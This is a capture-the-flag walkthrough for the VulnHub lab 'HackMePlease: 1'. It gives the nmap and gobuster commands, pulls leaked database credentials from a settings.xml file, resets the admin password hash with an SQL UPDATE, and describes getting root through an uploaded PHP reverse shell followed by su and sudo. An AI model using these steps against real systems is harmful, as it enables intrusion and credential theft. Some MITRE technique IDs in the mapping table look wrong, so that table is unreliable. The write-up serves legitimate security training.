
## HackMePlease

| **Platform**   | VulnHub         |
| -------------- | --------------- |
| **Machine**    | HackMePlease: 1 |
| **Creator**    | Saket Sourav    |
| **OS**         | Linux           |
| **Difficulty** | Easy            |

use `netdiscover` to find the target VM, then use `Nmap`.

~~~
nmap -vv -p- 10.0.2.22                               
~~~

| Port  | Service |
| ----- | ------- |
| 80    | http    |
| 3306  | mysql   |
| 33060 | mysqlx  |


after going to the website, i found an endpoint in `/js/main.js` (which in itself was found via checking the source of the page).


<img width="962" height="82" alt="image" src="https://github.com/user-attachments/assets/5c13b56e-ff4f-4700-a8ae-87bc9eab2792" />


 accessing this path shows a login page.


<img width="1557" height="786" alt="image" src="https://github.com/user-attachments/assets/8a892a45-f8f3-40db-91d3-7172ff5bc999" />


 use gobuster to enumerate the **/seeddms51x** directory.
 
 ~~~
 gobuster dir -u http://10.0.2.22/seeddms51x -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.22/seeddms51x
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
www                  (Status: 301) [Size: 315] [--> http://10.0.2.22/seeddms51x/www/]
data                 (Status: 301) [Size: 316] [--> http://10.0.2.22/seeddms51x/data/]
conf                 (Status: 301) [Size: 316] [--> http://10.0.2.22/seeddms51x/conf/]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================  
 ~~~

then the **seeddms51x/conf** directory.

~~~
gobuster dir -u http://10.0.2.22/seeddms51x/conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js,cgi,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.22/seeddms51x/conf
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,js,cgi,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
settings.xml         (Status: 200) [Size: 12377]
Progress: 1543906 / 1543906 (100.00%)
===============================================================
Finished
===============================================================

~~~

 in **settings.xml**
 
~~~xml
 <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="seeddms" doNotCheckVersion="false"> </database>
~~~



login to `mysql` using the discovered credentials.

~~~
mysql -u seeddms -p -h 10.0.2.22 --ssl=0   
~~~



in the **seeddms** database, the table **users** gives us more potential credentials:

~~~
  saket               | saurav             | Saket@#$1337   
~~~


same goes for the table **tblUsers**:

~~~
  admin | f9ef2c539bad8a6d2f3432b6d49ab51a | Administrator | address@server.com | en_GB 
~~~


since cracking didn't work, [get the md5 hash](https://www.dcode.fr/md5-hash) of the word "admin",
update the table:

~~~
update tblUsers set pwd='21232f297a57a5a743894a0e4a801fc3' where login='admin';
~~~

and use the updated credentials in the login form found previously.
in the admin folder, there is an option to upload a file. use [pentestmonkey's php reverse shell](https://github.com/pentestmonkey/php-reverse-shell) to get access as **www-data**, triggering the shell by accessing the directory of the file (careful to remember the content offset - which can be found in the settings.xml file - and file id/name).
in `/home` we can see user **saket**, and use the password found earlier to su. saket has sudo privileges, so `sudo su` to get **root**.



#### MITRE ATT&CK Mapping

| **Actions**                | **Step**                                | **Technique**                                                                                                      |
| -------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| Service discovery          | Scan with Nmap                          | T1595 Active scanning                                                                                              |
| Web content discovery      | Directory enumeration with Gobuster     | T1595.003 Active Scanning: Wordlist Scanning                                                                       |
| Access hidden file         | Access `/js/main.js`                    | T1594  Search Victim-Owned Websites                                                                                |
| Access hidden form         | Access `/seeddms51x/seeddms-1.5.22/`    | T1594 Search Victim-Owned Websites                                                                                 |
| Access hidden file         | Access `/seeddms51x/conf/seetings.xml/` | T1552.001 Unsecured Credentials: Credentials In Files                                                              |
| Database enumeration       | Access database                         | T1213.006 Data from Information Repositories: Databases<br>T1078 Valid Accounts<br>T1552 Unsecured Credentials<br> |
| Persistence                | Change credentials                      | T1098 Account Manipulation                                                                                         |
| Initial access             | Login into Admin panel                  | T0859 Valid Accounts                                                                                               |
| Execution                  | Upload reverse shell                    | T1701.003 Command and Scripting Interpreter: Unix Shell                                                            |
| Local privilege escalation | su saket                                | T1078.003 Valid Accounts: Local accounts                                                                           |
| Local privilege escalation | sudo su                                 | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching                                                 |



#### OWASP Vulnerability Table

| **Vulnerability**         | **Impact**                                                                                                 |
| ------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Broken Access Control     | settings.xml found; credentials in database changed                                                        |
| Security Misconfiguration | database credentials obtained from settings.xml                                                            |
| Insecure Design           | credentials obtained from cleartext password storage in mysql table; reverse shell uploaded and triggered; |

